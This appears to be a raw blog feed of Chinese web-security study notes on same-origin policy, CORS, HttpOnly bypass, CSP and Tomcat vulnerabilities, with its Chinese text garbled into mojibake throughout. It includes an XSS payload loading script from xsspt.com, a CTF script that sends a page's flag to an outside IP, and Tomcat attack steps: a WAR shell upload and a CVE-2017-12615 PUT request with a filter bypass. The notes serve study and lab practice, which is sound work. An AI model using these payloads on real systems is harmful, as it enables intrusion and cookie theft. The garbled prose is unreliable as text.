title="è¡¥å……"></a>è¡¥å……</h1><h2 id="åŒæºç­–ç•¥"><a href="#åŒæºç­–ç•¥" class="headerlink" title="åŒæºç­–ç•¥"></a>åŒæºç­–ç•¥</h2><p>åŒæºçš„å®šä¹‰</p><p><img src="/../images/pxbcwxexdh-1686840019399.png" alt="img"></p><p>åŒæºçš„ç›®çš„</p><blockquote><p>åŒæºæ”¿ç­–çš„ç›®çš„ï¼Œæ˜¯ä¸ºäº†ä¿è¯ç”¨æˆ·ä¿¡æ¯çš„å®‰å…¨ï¼Œé˜²æ­¢æ¶æ„çš„ç½‘ç«™çªƒå–æ•°æ®ã€‚</p><p>è®¾æƒ³è¿™æ ·ä¸€ç§æƒ…å†µï¼šAç½‘ç«™æ˜¯ä¸€å®¶é“¶è¡Œï¼Œç”¨æˆ·ç™»å½•ä»¥åï¼Œåˆå»æµè§ˆå…¶ä»–ç½‘ç«™ã€‚å¦‚æœå…¶ä»–ç½‘ç«™å¯ä»¥è¯»å–Aç½‘ç«™çš„ Cookieï¼Œä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ</p><p>å¾ˆæ˜¾ç„¶ï¼Œå¦‚æœ Cookie åŒ…å«éšç§ï¼ˆæ¯”å¦‚å­˜æ¬¾æ€»é¢ï¼‰ï¼Œè¿™äº›ä¿¡æ¯å°±ä¼šæ³„æ¼ã€‚æ›´å¯æ€•çš„æ˜¯ï¼ŒCookie å¾€å¾€ç”¨æ¥ä¿å­˜ç”¨æˆ·çš„ç™»å½•çŠ¶æ€ï¼Œå¦‚æœç”¨æˆ·æ²¡æœ‰é€€å‡ºç™»å½•ï¼Œå…¶ä»–ç½‘ç«™å°±å¯ä»¥å†’å……ç”¨æˆ·ï¼Œä¸ºæ‰€æ¬²ä¸ºã€‚å› ä¸ºæµè§ˆå™¨åŒæ—¶è¿˜è§„å®šï¼Œæäº¤è¡¨å•ä¸å—åŒæºæ”¿ç­–çš„é™åˆ¶ã€‚</p><p>ç”±æ­¤å¯è§ï¼Œâ€åŒæºæ”¿ç­–â€æ˜¯å¿…éœ€çš„ï¼Œå¦åˆ™ Cookie å¯ä»¥å…±äº«ï¼Œäº’è”ç½‘å°±æ¯«æ— å®‰å…¨å¯è¨€äº†ã€‚</p></blockquote><h2 id="å¦‚ä½•è·¨åŸŸ"><a href="#å¦‚ä½•è·¨åŸŸ" class="headerlink" title="å¦‚ä½•è·¨åŸŸ"></a>å¦‚ä½•è·¨åŸŸ</h2><ul><li><p>corsï¼ˆæ”¯æŒæ‰€æœ‰httpè¯·æ±‚ï¼‰</p><p>CORSï¼ˆCross-Origin Resource Sharingï¼‰æ˜¯ä¸€ç§è·¨åŸŸèµ„æºå…±äº«æœºåˆ¶ï¼Œå®ƒå…è®¸Webåº”ç”¨ç¨‹åºä»ä¸åŒçš„åŸŸåè®¿é—®èµ„æºï¼Œè€Œä¸å—åŒæºç­–ç•¥çš„é™åˆ¶ã€‚CORSæœºåˆ¶éœ€è¦åœ¨æœåŠ¡ç«¯è¿›è¡Œé…ç½®ï¼Œå¹¶ä¸”éœ€è¦åœ¨æ¯ä¸ªè·¨åŸŸè¯·æ±‚ä¸­æ·»åŠ ç‰¹å®šçš„HTTPå¤´éƒ¨ä¿¡æ¯ï¼Œä¾‹å¦‚â€œAccess-Control-Allow-Originâ€å’Œâ€œAccess-Control-Allow-Methodsâ€ç­‰ã€‚CORSæœºåˆ¶å¯ä»¥æ”¯æŒå„ç§ç±»å‹çš„HTTPè¯·æ±‚ï¼ŒåŒ…æ‹¬GETã€POSTã€PUTã€DELETEç­‰ï¼Œå› æ­¤å®ƒåœ¨Webåº”ç”¨ç¨‹åºä¸­çš„åº”ç”¨éå¸¸å¹¿æ³›ã€‚</p></li><li><p>jsonpï¼ˆåªæ”¯æŒgetè¯·æ±‚ï¼‰</p><p>JSONPï¼ˆJSON with Paddingï¼‰æ˜¯ä¸€ç§åˆ©ç”¨<script>æ ‡ç­¾çš„GETè¯·æ±‚å®ç°è·¨åŸŸæ•°æ®ä¼ è¾“çš„æŠ€æœ¯ï¼Œå®ƒé€šè¿‡åœ¨è¯·æ±‚URLä¸­æ·»åŠ ä¸€ä¸ªå›è°ƒå‡½æ•°åæ¥å®ç°è·¨åŸŸè®¿é—®ã€‚ç”±äºJSONPæ˜¯åŸºäº<script>æ ‡ç­¾çš„GETè¯·æ±‚ï¼Œä¸å…·å¤‡ä¿®æ”¹æ•°æ®çš„èƒ½åŠ›ï¼Œå› æ­¤å®ƒä¸ä¼šå¼•èµ·CSRFæ¼æ´ã€‚ä½†æ˜¯ï¼Œç”±äºJSONPä»…æ”¯æŒGETè¯·æ±‚ï¼Œå› æ­¤å®ƒçš„åº”ç”¨åœºæ™¯å—åˆ°é™åˆ¶ã€‚</p></li></ul><h4 id="xssè·¨åŸŸ"><a href="#xssè·¨åŸŸ" class="headerlink" title="xssè·¨åŸŸ"></a>xssè·¨åŸŸ</h4><p>å¼•å…¥å…¶ä»–æ¶æ„scriptä»£ç </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="built_in">eval</span>(<span class="string">&#x27;window.s=document.createElement(&quot;script&quot;);window.s.src=&quot;//xsspt.com/XXcxou&quot;;document.body.appendChild(window.s)&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="è·¨æºèµ„æºå…±äº«-CORS"><a href="#è·¨æºèµ„æºå…±äº«-CORS" class="headerlink" title="è·¨æºèµ„æºå…±äº«--CORS"></a>è·¨æºèµ„æºå…±äº«--CORS</h2><p><a href="http://huang-x-h.github.io/2015/03/11/cors-preflight/">XMLHttpRequestè·¨åŸŸé¢„æ£€</a></p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Authentication">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Authentication</a></p><p>é¢„æ£€çš„responseæ•°æ®åŒ…</p><blockquote><p>Access-Control-Allow-Originï¼šå‘Šè¯‰æµè§ˆå™¨å…è®¸è¯¥æºè®¿é—®èµ„æºã€‚<br>Access-Control-Expose-Headersï¼šå‘Šè¯‰æµè§ˆå™¨å…è®¸è·å¾—é™¤äº†åŸºæœ¬å“åº”å¤´å¤–çš„å“ªäº›å“åº”å¤´<br>Access-Control-Allow-Credentials: true æ˜¯å¦å…è®¸æµè§ˆå™¨è¯»å– response çš„å†…å®¹<br>Access-Control-Allow-Methodsï¼š æŒ‡å®šäº†è®¿é—®èµ„æºæ—¶å…è®¸ä½¿ç”¨çš„è¯·æ±‚æ–¹æ³•<br>Access-Control-Allow-Headersï¼š æŒ‡æ˜äº†å®é™…è¯·æ±‚ä¸­å…è®¸æºå¸¦çš„æ ‡å¤´å­—æ®µã€‚</p></blockquote><p>æºå¸¦cookieè·¨åŸŸ</p><p><img src="/../images/image-20230320220034977-1686840019399.png" alt="image-20230320220034977"></p><p><a href="https://www.cnblogs.com/byErichas/p/15918919.html">https://www.cnblogs.com/byErichas/p/15918919.html</a></p><h2 id="ç»•è¿‡httponly"><a href="#ç»•è¿‡httponly" class="headerlink" title="ç»•è¿‡httponly"></a>ç»•è¿‡httponly</h2><h4 id="Apache-httpOnly-Cookieæ³„éœ²-CVE-2012-0053"><a href="#Apache-httpOnly-Cookieæ³„éœ²-CVE-2012-0053" class="headerlink" title="Apache httpOnly Cookieæ³„éœ²( CVE-2012-0053)"></a>Apache httpOnly Cookieæ³„éœ²( CVE-2012-0053)</h4><h4 id="CORS-cookieå›æ˜¾"><a href="#CORS-cookieå›æ˜¾" class="headerlink" title="CORS+cookieå›æ˜¾"></a>CORS+cookieå›æ˜¾</h4><p>ä¾‹é¢˜</p><p><a href="https://nikoeurus.github.io/2019/11/14/UNCTF-Web%E5%A4%8D%E7%8E%B0/#easyxss">https://nikoeurus.github.io/2019/11/14/UNCTF-Web%E5%A4%8D%E7%8E%B0/#easyxss</a></p><p>æ¡ä»¶1</p><blockquote><p>responseæ•°æ®åŒ…ä¸­</p><p>Access-Control-Allow-Headers: X-Requested-Withï¼Œè¯´æ˜äº†æˆ‘ä»¬å¯ä»¥é€šè¿‡<strong>XHR</strong>è¯·æ±‚æ¥è®¿é—®ç½‘ç«™</p><p><code>XMLHttpRequest</code>æ˜¯ç”¨äºåœ¨åå°ä¸æœåŠ¡å™¨äº¤æ¢æ•°æ®ã€‚å¦‚æœè®¾ç½®XHRè¯·æ±‚ç½‘ç«™ï¼Œé‚£ä¹ˆè¯·å¤´éƒ¨å¿…ç„¶ä¼šå¸¦æœ‰ï¼š<code>Origin:xxx</code>ï¼Œåˆ™ä¼šè¢«æœåŠ¡å™¨è§†ä¸ºåŒæºè®¿é—®</p></blockquote><p>æ¡ä»¶2</p><p>æ²¡æœ‰å…³é—­debugæ¨¡å¼ï¼Œå¯¼è‡´cookieå›æ˜¾</p><p><img src="/../images/39-1686840019399.png" alt="img"></p><p>åˆ©ç”¨<code>location.href</code>é‡å®šå‘åˆ°vpsï¼Œä»è€Œå¸¦å‡ºcookie</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xmlhttp.<span class="property">onreadystatechange</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(xmlhttp.<span class="property">readyState</span>==<span class="number">4</span>)&#123;</span><br><span class="line">        location.<span class="property">href</span>=<span class="string">&#x27;http://106.15.250.162:8888/?flag=&#x27;</span>+ xmlhttp.<span class="property">responseText</span>.<span class="title function_">match</span>(<span class="string">&#x27;flag\\&#123;(.\*?)\\&#125;&#x27;</span>)[<span class="number">1</span>]&#125;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;/index.php/treehole/view?id=&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.<span class="title function_">send</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="CST-traceè¯·æ±‚"><a href="#CST-traceè¯·æ±‚" class="headerlink" title="CST--traceè¯·æ±‚"></a>CST--traceè¯·æ±‚</h4><p>TRACE æ–¹æ³•ä¼šè¿”å›åŸå§‹è¯·æ±‚æŠ¥æ–‡ï¼Œå…¶ä¸­å°±åŒ…å«äº†cookie</p><p><a href="https://www.cnblogs.com/gaopei/p/11380349.html">https://www.cnblogs.com/gaopei/p/11380349.html</a></p><h2 id="JSONPåŠ«æŒæ¼æ´"><a href="#JSONPåŠ«æŒæ¼æ´" class="headerlink" title="JSONPåŠ«æŒæ¼æ´"></a>JSONPåŠ«æŒæ¼æ´</h2><p><a href="https://wolke.cn/post/c8aa67d0.html">CORSè·¨åŸŸæ¼æ´ä¸JSONPåŠ«æŒ | wolke</a></p><h2 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h2><p><a href="https://xz.aliyun.com/t/12370#toc-25">https://xz.aliyun.com/t/12370#toc-25</a></p><blockquote><p>CSPæŒ‡çš„æ˜¯Content Security Policyï¼Œå³å†…å®¹å®‰å…¨ç­–ç•¥ã€‚å®ƒæ˜¯ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œç”¨äºä¿æŠ¤ç½‘ç«™å…å—è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSæ”»å‡»ï¼‰ã€æ•°æ®ç›—å–ç­‰Webæ”»å‡»çš„å½±å“ã€‚<br>CSPæŒ‡ä»¤å¯ä»¥åœ¨HTTPå“åº”å¤´ä¸­è®¾ç½®ï¼Œä¹Ÿå¯ä»¥åœ¨HTMLæ–‡æ¡£ä¸­ä½¿ç”¨metaæ ‡ç­¾è®¾ç½®ã€‚<br>é€šè¿‡CSPï¼Œç½‘ç«™ç®¡ç†å‘˜å¯ä»¥å‘Šè¯‰æµè§ˆå™¨å“ªäº›èµ„æºå¯ä»¥åŠ è½½åˆ°é¡µé¢ä¸­ï¼Œä¾‹å¦‚å¯ä»¥ä¿¡ä»»å“ªäº›æ¥æºçš„JavaScriptã€CSSã€å›¾ç‰‡ç­‰èµ„æºã€‚è¿™æ ·ï¼Œæµè§ˆå™¨å°±åªä¼šåŠ è½½æ¥è‡ªè¿™äº›å—ä¿¡ä»»æ¥æºçš„èµ„æºï¼Œä»è€Œå‡å°‘äº†è¢«æ¶æ„è„šæœ¬æ”»å‡»çš„é£é™©ã€‚</p></blockquote><p><img src="/../images/image-20230512151453267-1686840019399.png" alt="image-20230512151453267"></p><h1 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h1><ul><li>CSP</li><li>htmlå®ä½“ç¼–ç ï¼Œé»‘åå•ï¼Œè½¬ä¹‰å­—ç¬¦</li></ul>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Tomcatæ¼æ´</title>
      <link href="/2023/06/01/Tomcat%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/06/01/Tomcat%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>vulhub</p><h2 id="Tomatäº†è§£"><a href="#Tomatäº†è§£" class="headerlink" title="Tomatäº†è§£"></a>Tomatäº†è§£</h2><h3 id="ç›®å½•ç»“æ„"><a href="#ç›®å½•ç»“æ„" class="headerlink" title="ç›®å½•ç»“æ„"></a>ç›®å½•ç»“æ„</h3><p><img src="/../images/image-20230228234754791-1686995572132.png" alt="image-20230228234754791"></p><p>webapps</p><p><img src="/../images/image-20230617184342638.png" alt="image-20230617184342638"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. binç›®å½•: å­˜æ”¾ä¸€äº›äºŒè¿›åˆ¶çš„æ–‡ä»¶ï¼Œä¾‹å¦‚Tomcatå¸¸ç”¨çš„ å¯åŠ¨è„šæœ¬: startup.batæˆ–startup.sh å…³é—­è„šæœ¬: shutdown.bat æˆ– shutdown.shç­‰ç­‰</span><br><span class="line"></span><br><span class="line">2. confç›®å½•: å­˜æ”¾çš„æ˜¯Tomcatçš„é…ç½®æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">server.xmlï¼šå¯ä»¥è®¾ç½®ç«¯å£å·ã€è®¾ç½®åŸŸåæˆ–IPã€é»˜è®¤åŠ è½½çš„é¡¹ç›®ã€è¯·æ±‚ç¼–ç </span><br><span class="line">web.xmlï¼šéƒ¨ç½²æè¿°æ–‡ä»¶ï¼Œè¿™ä¸ªweb.xmlä¸­æè¿°äº†ä¸€äº›é»˜è®¤çš„servletï¼Œéƒ¨ç½²æ¯ä¸ªwebappæ—¶ï¼Œéƒ½ä¼šè°ƒç”¨è¿™ä¸ªæ–‡ä»¶ï¼Œé…ç½®è¯¥webåº”ç”¨çš„é»˜è®¤servlet</span><br><span class="line">context.xmlï¼šå¯ä»¥ç”¨æ¥é…ç½®æ•°æ®æºä¹‹ç±»çš„</span><br><span class="line">tomcat-users.xmlï¼šç”¨æ¥é…ç½®ç®¡ç†tomcatçš„ç”¨æˆ·ä¸æƒé™</span><br><span class="line">Catalina:å¯ä»¥è®¾ç½®é»˜è®¤åŠ è½½çš„é¡¹ç›®</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3. libç›®å½•: å­˜æ”¾çš„æ˜¯å…¨å±€çš„jaråŒ…</span><br><span class="line"></span><br><span class="line">4. logsç›®å½•: å­˜æ”¾çš„æ˜¯Tomcatçš„æ—¥å¿—ï¼Œå¦‚æœTomcatå‡ºé”™ä»€ä¹ˆçš„ï¼Œå°±éœ€è¦åœ¨è¿™é‡Œçš„æ—¥å¿—ä¸­æŸ¥æ‰¾é—®é¢˜</span><br><span class="line"></span><br><span class="line">5. tempç›®å½•: å­˜æ”¾çš„æ˜¯ä¸´æ—¶æ€§çš„æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">6. webappsç›®å½•: å­˜æ”¾çš„æ˜¯Javaçš„Webé¡¹ç›®ï¼Œè¦éƒ¨ç½²çš„é¡¹ç›®å°±éœ€è¦æ”¾åœ¨è¿™ä¸ªç›®å½•å½“ä¸­</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">7. workç›®å½•: å­˜æ”¾çš„æ˜¯ç”±JSPä»£ç ç¿»è¯‘çš„Javaä»£ç ï¼Œä»¥åŠç¼–è¯‘çš„.classæ–‡ä»¶</span><br></pre></td></tr></table></figure><h2 id="fofaè¯­æ³•"><a href="#fofaè¯­æ³•" class="headerlink" title="fofaè¯­æ³•"></a>fofaè¯­æ³•</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title=&quot;Apache Tomcat&quot;</span><br><span class="line">server=&quot;Tomcat&quot; </span><br><span class="line"></span><br><span class="line">ç‰ˆæœ¬å·ï¼šåœ¨Tomcatåé¢æ·»åŠ /x.x</span><br></pre></td></tr></table></figure><h2 id="Tomcatæ¼æ´"><a href="#Tomcatæ¼æ´" class="headerlink" title="Tomcatæ¼æ´"></a>Tomcatæ¼æ´</h2><h3 id="managerå¼±å£ä»¤-éƒ¨ç½²waråŒ…getshell"><a href="#managerå¼±å£ä»¤-éƒ¨ç½²waråŒ…getshell" class="headerlink" title="managerå¼±å£ä»¤+éƒ¨ç½²waråŒ…getshell"></a>managerå¼±å£ä»¤+éƒ¨ç½²waråŒ…getshell</h3><h4 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h4><p>å…¨ç‰ˆæœ¬</p><h4 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h4><blockquote><p>conf&#x2F;tomcat-users.xmlä¸­ä¿å­˜äº†ç™»å½•å‡­è¯ï¼Œå¯¼è‡´å¯èƒ½å­˜åœ¨å¼±å£ä»¤æ¼æ´ï¼Œä»è€Œèƒ½è®¿é—®Manager APPä¸Šä¼ åé—¨ã€‚</p></blockquote><p><img src="/../images/image-20230228232924268-1686995572133.png" alt="image-20230228232924268"></p><p>è¿›å…¥managerç•Œé¢åå¯ä»¥éƒ¨ç½²waråŒ…</p><p>â€‹<img src="/../images/image-20230228232939975-1686995572134.png" alt="image-20230228232939975"></p><blockquote><p>waråŒ…ä¸ºjspå‹ç¼©æ–‡ä»¶ï¼ˆ<code>jar cvf xxx.jsp</code>ï¼‰ï¼ŒTomcatä¼šè‡ªåŠ¨è§£å‹ï¼Œ</p><p>å¦‚å°†shell.jspæ‰“åŒ…ä¸ºshell.warï¼ŒTomcatä¼šå°†å…¶è§£å‹ä¸º&#x2F;shell&#x2F;shell.jsp</p></blockquote><p><img src="/../images/image-20230228233506559-1686995572134.png" alt="image-20230228233506559"></p><h4 id="ä¿®å¤æ–¹æ¡ˆ"><a href="#ä¿®å¤æ–¹æ¡ˆ" class="headerlink" title="ä¿®å¤æ–¹æ¡ˆ"></a>ä¿®å¤æ–¹æ¡ˆ</h4><p>åˆ é™¤manageç›®å½•ï¼Œä¿®æ”¹conf&#x2F;tomcat-users.xmlä¸­çš„ç”¨æˆ·å‡­è¯</p><h3 id="putä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼ˆCVE-2017-12615ï¼‰"><a href="#putä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼ˆCVE-2017-12615ï¼‰" class="headerlink" title="putä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼ˆCVE-2017-12615ï¼‰"></a>putä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼ˆCVE-2017-12615ï¼‰</h3><h4 id="å½±å“ç‰ˆæœ¬-1"><a href="#å½±å“ç‰ˆæœ¬-1" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h4><p>å…¨ç‰ˆæœ¬</p><h4 id="å¤ç°-1"><a href="#å¤ç°-1" class="headerlink" title="å¤ç°"></a>å¤ç°</h4><p>conf&#x2F;web.xmlæ–‡ä»¶é…ç½®äº†readonly&#x3D;falseï¼Œå¯¼è‡´å¯ä»¥å†™æ–‡ä»¶</p><p><img src="/../images/image-20230625214424587.png" alt="image-20230625214424587"></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/1.jsp/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.174.129:8080</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>693</span><br><span class="line"></span><br><span class="line"><span class="language-dockerfile"><span class="keyword">shell</span></span></span><br></pre></td></tr></table></figure><p>éœ€è¦åœ¨ç»“å°¾åŠ ä¸Š<code>/</code>æ¥ç»•è¿‡å¯¹<code>.jsp</code>çš„è¿‡æ»¤ï¼Œæˆ–è€…ä½¿ç”¨å…¶ä»–çš„ç³»ç»Ÿæ–‡ä»¶åç‰¹æ€§</p><h4 id="ä¿®å¤æ–¹æ¡ˆ-1"><a href="#ä¿®å¤æ–¹æ¡ˆ-1" class="headerlink" title="ä¿®å¤æ–¹æ¡ˆ"></a>ä¿®å¤æ–¹æ¡ˆ</h4><p>conf&#x2F;web.xmlæ–‡ä»¶é…ç½®readonlyå€¼ä¸ºTrueæˆ–æ³¨é‡Šè¯¥å‚æ•°</p><h3 id="AJPæ–‡ä»¶åŒ…å«-x2F-è¯»å–â€“Ghostcatå¹½çµçŒ«ï¼ˆCVE-2020-1938ï¼‰"><a href="#AJPæ–‡ä»¶åŒ…å«-x2F-è¯»å–â€“Ghostcatå¹½çµçŒ«ï¼ˆCVE-2020-1938ï¼‰" class="headerlink" title="AJPæ–‡ä»¶åŒ…å«&#x2F;è¯»å–â€“Ghostcatå¹½çµçŒ«ï¼ˆCVE-2020-1938ï¼‰"></a>AJPæ–‡ä»¶åŒ…å«&#x2F;è¯»å–â€“Ghostcatå¹½çµçŒ«ï¼ˆCVE-2020-1938ï¼‰</h3><h4 id="å½±å“ç‰ˆæœ¬-2"><a href="#å½±å“ç‰ˆæœ¬-2" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h4><p><img src="/../images/image-20230617182333230.png" alt="image-20230617182333230"></p><h4 id="å¤ç°-2"><a href="#å¤ç°-2" class="headerlink" title="å¤ç°"></a>å¤ç°</h4><p>æ¼æ´åŸç†ï¼š</p><p><a href="https://mp.weixin.qq.com/s/D1hiKJpah3NhEBLwtTodsg">https://mp.weixin.qq.com/s/D1hiKJpah3NhEBLwtTodsg</a></p><p>è„šæœ¬ï¼š</p><p><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a></p><p><strong>python2è¿è¡Œ</strong></p><p><strong>å¯ä»¥è¯»å–æˆ–åŒ…å« Tomcat ä¸Šæ‰€æœ‰ webapp ç›®å½•ä¸‹çš„ä»»æ„æ–‡ä»¶</strong></p><p><img src="/../images/image-20230617184142564.png" alt="image-20230617184142564"></p><p><img src="/../images/image-20230617184129890.png" alt="image-20230617184129890"></p><h4 id="æ¼æ´æ£€æµ‹ä¸ä¿®å¤"><a href="#æ¼æ´æ£€æµ‹ä¸ä¿®å¤" class="headerlink" title="æ¼æ´æ£€æµ‹ä¸ä¿®å¤"></a>æ¼æ´æ£€æµ‹ä¸ä¿®å¤</h4><p><a href="https://www.chaitin.cn/zh/ghostcat">https://www.chaitin.cn/zh/ghostcat</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å¤ç° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ¸—é€æµ‹è¯•æµç¨‹</title>
      <link href="/2023/06/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/"/>
      <url>/2023/06/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="æ€»ä½“æµç¨‹"><a href="#æ€»ä½“æµç¨‹" class="headerlink" title="æ€»ä½“æµç¨‹"></a>æ€»ä½“æµç¨‹</h1><p><img src="/../images/1550719703_5c6e1ad700bb6-1685533751883.png!small" alt="å›¾ç‰‡.png"></p><p>â€‹<a href="https://www.freebuf.com/column/196291.html">æ¸—é€æµ‹è¯•çš„8ä¸ªæ­¥éª¤ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ˜ç¡®ç›®æ ‡ï¼šä¸å®¢æˆ·äº¤æµï¼Œå¾—åˆ°æ¸—é€çš„èŒƒå›´ï¼Œè§„åˆ™å’Œéœ€æ±‚</span><br><span class="line">ä¿¡æ¯æ”¶é›†ï¼šèµ„äº§æ”¶é›†+æ•æ„Ÿä¿¡æ¯æ”¶é›†+æŒ‡çº¹è¯†åˆ«</span><br><span class="line">æ¼æ´æ¢æµ‹å’Œä¿¡æ¯åˆ†æï¼šæ¼æ´æ¢æµ‹ä¸åˆ©ç”¨</span><br><span class="line">è·å–æ‰€éœ€ï¼šåæ¸—é€</span><br><span class="line">ä¿¡æ¯æ•´ç†å’Œå½¢æˆæŠ¥å‘Šï¼šäº§å‡ºæŠ¥å‘Š</span><br></pre></td></tr></table></figure><h1 id="èµ„äº§æ”¶é›†"><a href="#èµ„äº§æ”¶é›†" class="headerlink" title="èµ„äº§æ”¶é›†"></a>èµ„äº§æ”¶é›†</h1><h2 id="ä¸ºä»€ä¹ˆ"><a href="#ä¸ºä»€ä¹ˆ" class="headerlink" title="ä¸ºä»€ä¹ˆ"></a>ä¸ºä»€ä¹ˆ</h2><p><strong>å°½å¯èƒ½çš„æ‰©å¤§æ”»å‡»é¢</strong></p><h2 id="ä¸»åŸŸåæ”¶é›†"><a href="#ä¸»åŸŸåæ”¶é›†" class="headerlink" title="ä¸»åŸŸåæ”¶é›†"></a>ä¸»åŸŸåæ”¶é›†</h2><h3 id="ICPå¤‡æ¡ˆæŸ¥è¯¢"><a href="#ICPå¤‡æ¡ˆæŸ¥è¯¢" class="headerlink" title="ICPå¤‡æ¡ˆæŸ¥è¯¢"></a>ICPå¤‡æ¡ˆæŸ¥è¯¢</h3><ul><li><p>æ˜¯ä»€ä¹ˆ</p><p>ICPå¤‡æ¡ˆæ˜¯æŒ‡ç½‘ç«™åœ¨ä¿¡æ¯äº§ä¸šéƒ¨æäº¤ç½‘ç«™ä¿¡æ¯è¿›è¡Œå®˜æ–¹è®¤å¯ã€‚</p><p>æ‰€ä»¥å›½å†…ä½¿ç”¨å›½å†…æœåŠ¡å™¨çš„ç½‘ç«™ï¼Œéƒ½å¿…é¡»è¦å…ˆåŠç†ICPå¤‡æ¡ˆåæ‰å¯ä»¥ä¸Šçº¿ã€‚</p></li><li><p>æœ‰ä»€ä¹ˆç”¨</p><p>é€šè¿‡æŸ¥è¯¢ç›®æ ‡ä¼ä¸šçš„å¤‡æ¡ˆä¿¡æ¯ï¼Œå¯ç›´æ¥è·å–åˆ°ç›®æ ‡ä¼ä¸šæ³¨å†Œäº†å“ªäº›åŸŸåï¼Œä»è€Œå¢åŠ å¯æ¸—é€çš„ç›®æ ‡èŒƒå›´ã€‚</p></li><li><p>åœ¨çº¿æŸ¥è¯¢</p><p><a href="https://beian.miit.gov.cn/#/Integrated/recordQuery">ICP&#x2F;IPåœ°å€&#x2F;åŸŸåä¿¡æ¯å¤‡æ¡ˆç®¡ç†ç³»ç»Ÿ</a></p><p><a href="https://www.gsxt.gov.cn/index.html">å›½å®¶ä¼ä¸šä¿¡ç”¨ä¿¡æ¯å…¬ç¤ºç³»ç»Ÿ</a></p><p><a href="https://www.qcc.com/">ä¼æŸ¥æŸ¥ </a></p><p><a href="https://www.tianyancha.com/">å¤©çœ¼æŸ¥</a></p></li><li><p>å·¥å…·</p><p><a href="https://github.com/1in9e/icp-domains">1in9e&#x2F;icp-domains: è¾“å…¥ä¸€ä¸ªåŸŸåï¼Œè¾“å‡ºICPå¤‡æ¡ˆæ‰€æœ‰å…³è”åŸŸå</a></p></li></ul><h3 id="WhoIs"><a href="#WhoIs" class="headerlink" title="WhoIs"></a>WhoIs</h3><ul><li><p>æ˜¯ä»€ä¹ˆ</p><p><code>WHOIS</code>æ˜¯ç”¨æ¥æŸ¥è¯¢äº’è”ç½‘ä¸­åŸŸåçš„IPä»¥åŠæ‰€æœ‰è€…ç­‰ä¿¡æ¯çš„ä¼ è¾“åè®®ã€‚</p></li><li><p>æœ‰ä»€ä¹ˆç”¨</p><p>é€šè¿‡æŸ¥è¯¢ç›®æ 